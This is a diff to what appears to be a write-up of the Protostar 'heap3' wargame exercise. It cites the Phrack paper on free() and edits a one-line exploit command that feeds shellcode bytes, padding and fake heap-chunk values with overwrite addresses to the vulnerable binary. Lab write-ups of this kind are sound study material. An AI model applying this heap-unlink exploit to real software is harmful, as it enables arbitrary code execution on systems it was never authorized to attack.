@@ -162,7 +162,7 @@ The Phrack paper [Once upon a free()](https://phrack.org/issues/57/9) describes 
 
 ## exploit command
 ```bash
-./heap3 $(python2 -c "print 'AAAA'*3+'\xB8\x64\x88\x04\x08\xFF\xD0'") $(python2 -c "print 'B'*36 + '\x65'") $(python2 -c "print '\xfc\xff\xff\xff'*2+'\x1c\xb1\x04\x08' + '\x14\xc0\x04\x08'")
+./heap3 $(python2 -c "print 'AAAA'*3+'\xB8\x64\x88\x04\x08\xFF\xD0'") $(python2 -c "print 'BBBB'*9 + '\x65'") $(python2 -c "print 'CCCC'*23+'\xfc\xff\xff\xff'*2+'\x1c\xb1\x04\x08' + '\x14\xc0\x04\x08'")
 ```
 
 
